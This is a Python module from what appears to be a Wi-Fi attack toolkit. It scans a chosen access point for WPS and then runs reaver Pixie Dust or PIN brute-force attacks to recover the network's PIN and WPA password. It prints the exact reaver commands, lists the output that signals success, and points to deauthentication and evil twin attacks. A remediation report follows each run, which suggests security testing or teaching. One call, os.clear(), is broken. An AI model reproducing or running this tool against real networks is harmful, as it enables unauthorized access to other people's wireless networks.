# attacks/wps_attack.py
"""WPS PIN/Pixie Dust attack implementation using reaver."""
import os
import subprocess
import sys
import time
from termcolor import colored
from .base import BaseAttack
from utils.helpers import run_in_new_terminal
from solution.remediation import RemediationAdvisor


class WPSAttack(BaseAttack):
    """Performs WPS PIN brute-force and Pixie Dust attacks."""
    
    def __init__(self, monitor_interface: str, bssid: str, ssid: str, channel: int):
        super().__init__(monitor_interface)
        self.bssid = bssid
        self.ssid = ssid
        self.channel = channel
    
    def _check_wps_enabled(self) -> dict:
        """Check if target AP has WPS enabled using wash tool."""
        print(colored(f"[*] Checking WPS status for {self.ssid}...", "cyan"))

        import threading

        # Check if wash is installed
        try:
            subprocess.run(["which", "wash"], capture_output=True, check=True)
        except subprocess.CalledProcessError:
            print(colored("[!] ERROR: 'wash' tool not found!", "red"))
            print(colored("    Install with: sudo apt install reaver", "yellow"))
            return {'enabled': False, 'locked': False}

        # Set interface to correct channel
        try:
            subprocess.run(
                ["iwconfig", self.monitor_interface, "channel", str(self.channel)],
                capture_output=True,
                timeout=5
            )
            time.sleep(1)
        except:
            pass

        wps_result = {'enabled': False, 'locked': False}
        seconds = 20

        # Countdown function
        def countdown():
            for i in range(seconds, 0, -1):
                print(
                    colored(f"\r[*] Running wash scan... {i:02d}s remaining", "yellow"),
                    end="", flush=True
                )
                time.sleep(1)
            print(colored("\r[✓] Wash scan completed!            ", "green"))

        try:
            # Start countdown thread
            timer_thread = threading.Thread(target=countdown)
            timer_thread.start()

            # Run wash
            result = subprocess.run(
                ["timeout", str(seconds), "wash", "-i", self.monitor_interface],
                capture_output=True,
                text=True
            )

            timer_thread.join()

            output_lines = result.stdout.split('\n')

            for line in output_lines:
                bssid_normalized = self.bssid.upper().replace(':', '').replace('-', '')
                line_normalized = line.upper().replace(':', '').replace('-', '')

                if bssid_normalized in line_normalized:
                    wps_result['enabled'] = True

                    if 'Yes' in line:
                        parts = line.split()
                        for i, part in enumerate(parts):
                            if part.upper() == 'YES' and i > 4:
                                wps_result['locked'] = True
                                break

                    print(colored("[✓] WPS is ENABLED on target AP!", "green", attrs=['bold']))

                    if wps_result['locked']:
                        print(colored("[!] WPS appears to be LOCKED (rate limited)", "yellow"))
                    else:
                        print(colored("[✓] WPS is UNLOCKED - good chance of success!", "green"))

                    return wps_result

            print(colored("[✗] WPS is NOT enabled or not detectable", "red"))
            return wps_result

        except subprocess.TimeoutExpired:
            print(colored("\n[!] Wash scan timed out", "yellow"))
            return wps_result

        except Exception as e:
            print(colored(f"\n[!] Error during wash scan: {e}", "red"))
            return wps_result
        
    def _execute(self):
        """Execute WPS attack."""
        print(colored(f"[*] Setting {self.monitor_interface} to channel {self.channel}...", "cyan"))
        subprocess.run(["iwconfig", self.monitor_interface, "channel", str(self.channel)], 
                      capture_output=True)
        
        wps_info = self._check_wps_enabled()
        
        if not wps_info['enabled']:
            print(colored("\n" + "="*60, "red"))
            print(colored("⚠️  WPS ATTACK NOT POSSIBLE", "red", attrs=['bold']))
            print(colored("="*60, "red"))
            print(colored("\n[✗] WPS is NOT enabled on this Access Point", "red", attrs=['bold']))
            print(colored("[!] WPS attack requires WPS to be enabled on the router", "yellow"))
            print(colored("\n💡 Try these attacks instead:", "cyan", attrs=['bold']))
            print(colored("    • Handshake Capture (Option 1)", "green"))
            print(colored("    • Deauthentication Attack (Option 2)", "green"))
            print(colored("    • Evil Twin + CSA (Option 4)", "green"))
            print(colored("\n[*] Returning to attack menu...\n", "cyan"))
            
            input(colored("Press Enter to continue...", "yellow"))
            return
        
        if wps_info['locked']:
            print(colored("\n[⚠️] WARNING: WPS is LOCKED (Rate Limited)", "yellow", attrs=['bold']))
            print(colored("    Pixie Dust may still work, but PIN brute-force will be very slow\n", "yellow"))
            
            choice = input(colored("[?] WPS is locked. Continue anyway? (y/N): ", "yellow")).strip().lower()
            if choice != 'y':
                print(colored("\n[*] Attack cancelled.", "cyan"))
                return
        
        os.system('cls' if os.name == 'nt' else 'clear')
        print(colored("\n╔" + "═" * 60 + "╗", "yellow", attrs=['bold']))
        print(colored("║" + " " * 18 + "🔐 WPS ATTACK MODES" + " " * 21 + "  ║", "yellow", attrs=['bold']))
        print(colored("╚" + "═" * 60 + "╝", "yellow", attrs=['bold']))
        
        print(f"\n📍 Target: {colored(self.ssid, 'yellow', attrs=['bold'])}")
        print(f"   BSSID: {self.bssid}")
        print(f"   Channel: {self.channel}")
        print(colored(f"   WPS: ✓ ENABLED", "green", attrs=['bold']))
        
        if wps_info['locked']:
            print(colored(f"   Status: ⚠️  Locked/Rate Limited", "yellow"))
        else:
            print(colored(f"   Status: ✓ Unlocked (Good!)", "green"))
        
        print(f"   Interface: {colored(self.monitor_interface, 'cyan')}\n")
        
        print(colored(" [1]", "red", attrs=['bold']) + " 💎 Pixie Dust Attack (Fast)")
        print(colored(" [2]", "red", attrs=['bold']) + " 🔢 PIN Brute-Force (Slow)")
        print(colored(" [3]", "yellow", attrs=['bold']) + " 🎲 Both (Pixie Dust + PIN)")
        print(colored(" [0]", "white") + " ⬅️  Back")
        
        choice = input(colored("\n ➤ Select attack mode: ", "cyan", attrs=['bold'])).strip()
        
        if choice == '1':
            self._pixie_dust_attack()
        elif choice == '2':
            self._pin_bruteforce()
        elif choice == '3':
            print(colored("\n[*] Trying Pixie Dust first...", "cyan"))
            self._pixie_dust_attack()
            
            choice2 = input(colored("\n[?] Pixie Dust complete. Try PIN brute-force? (y/N): ", "yellow")).strip().lower()
            if choice2 == 'y':
                self._pin_bruteforce()
        else:
            print(colored("\n[*] Cancelled.", "yellow"))
    
    def _pixie_dust_attack(self):
        """Execute Pixie Dust attack using reaver."""
        print(colored("\n" + "="*60, "cyan"))
        print(colored("🎯 LAUNCHING PIXIE DUST ATTACK", "cyan", attrs=['bold']))
        print(colored("="*60, "cyan"))
        print(colored("\n[*] Exploits weak WPS random number generation.", "yellow"))
        print(colored("[*] If vulnerable, password revealed in seconds!", "green"))
        print(colored("\n[!] Press Ctrl+C in the attack window to stop\n", "red"))
        
        cmd = f"reaver -i {self.monitor_interface} -b {self.bssid} -c {self.channel} -K 1 -N -vv"
        
        print(colored(f"[*] Command: {cmd}\n", "cyan"))
        print(colored("[*] Attack starting in new terminal window...\n", "yellow"))
        
        time.sleep(2)
        run_in_new_terminal(cmd)
        
        print(colored("╔" + "═" * 58 + "╗", "green"))
        print(colored("║  💡 WHAT TO LOOK FOR:                               ║", "green"))
        print(colored("║                                                      ║", "green"))
        print(colored("║  ✓ Success: 'WPS PIN: XXXXXXXX'                     ║", "green"))
        print(colored("║  ✓ Success: 'WPA PSK: password'                     ║", "green"))
        print(colored("║  ✗ Fail: 'Failed to recover WPA'                    ║", "red"))
        print(colored("║  ⚠  Fail: 'AP rate limiting detected'               ║", "yellow"))
        print(colored("╚" + "═" * 58 + "╝", "green"))
        
        input(colored("\n[*] Press Enter when attack complete...", "cyan"))
        
        subprocess.run("pkill -9 reaver > /dev/null 2>&1", shell=True)
        print(colored("[*] Attack stopped.", "cyan"))

        advisor = RemediationAdvisor()
        print(colored("Loading report and fixing steps ", "yellow"), end="")

        spinner = ["|", "/", "-", "\\"]

        for i in range(12):  # animation cycles
            sys.stdout.write("\r" + colored("Loading report and fixing steps " + spinner[i % 4], "yellow"))
            sys.stdout.flush()
            time.sleep(0.25)
        time.sleep(5)   

        print("\r" + colored("Report loaded successfully ✓", "green"))

        os.clear()
        advisor.show(
            attack_type="wps",
            target_ssid=self.ssid,
            target_bssid=self.bssid,
            extra_info={
                "method": "Pixie Dust",
                "channel": self.channel,
                "interface": self.monitor_interface
            }
        )


    
    def _pin_bruteforce(self):
        """Execute WPS PIN brute-force using reaver."""
        print(colored("\n" + "="*60, "cyan"))
        print(colored("🎯 LAUNCHING WPS PIN BRUTE-FORCE", "cyan", attrs=['bold']))
        print(colored("="*60, "cyan"))
        print(colored("\n[!] WARNING: This attack is VERY SLOW (hours/days)", "red", attrs=['bold']))
        print(colored("[*] Reaver will try ~11,000 PIN combinations.", "yellow"))
        
        confirm = input(colored("\n[?] This will take HOURS. Continue? (y/N): ", "yellow")).strip().lower()
        
        if confirm != 'y':
            print(colored("[*] Attack cancelled.", "cyan"))
            return
        
        cmd = f"reaver -i {self.monitor_interface} -b {self.bssid} -c {self.channel} -d 1 -T 0.5 -vv -L -N -r 5:3"
        
        print(colored(f"\n[*] Command: {cmd}\n", "cyan"))
        print(colored("[*] Starting PIN brute-force in new terminal...\n", "yellow"))
        
        time.sleep(2)
        run_in_new_terminal(cmd)
        
        print(colored("╔" + "═" * 58 + "╗", "yellow"))
        print(colored("║  ⏱️  PIN ATTACK INFO:                                ║", "yellow"))
        print(colored("║                                                      ║", "yellow"))
        print(colored("║  Progress: 'XX.XX% complete'                        ║", "cyan"))
        print(colored("║  Success: 'WPS PIN: XXXXXXXX'                       ║", "green"))
        print(colored("║  Duration: 4-48 hours (depends on AP)               ║", "yellow"))
        print(colored("║  Tip: Results auto-saved in ~/.reaver/              ║", "cyan"))
        print(colored("╚" + "═" * 58 + "╝", "yellow"))
        
        input(colored("\n[*] Press Enter to return...", "cyan"))
        
        print(colored("\n[*] Attack running in background.", "cyan"))
        print(colored("[*] To stop: pkill reaver", "yellow"))
        
        
        advisor = RemediationAdvisor()
        print(colored("Loading report and fixing steps ", "yellow"), end="")

        spinner = ["|", "/", "-", "\\"]

        for i in range(12):  # animation cycles
            sys.stdout.write("\r" + colored("Loading report and fixing steps " + spinner[i % 4], "yellow"))
            sys.stdout.flush()
            time.sleep(0.25)
        
        
        print("\r" + colored("Report loaded successfully ✓", "green"))
        os.system("clear") 
        advisor.show(
            attack_type="wps",
            target_ssid=self.ssid,
            target_bssid=self.bssid,
            extra_info={
                "method": "PIN Brute Force",
                "channel": self.channel,
                "interface": self.monitor_interface
            }
        )
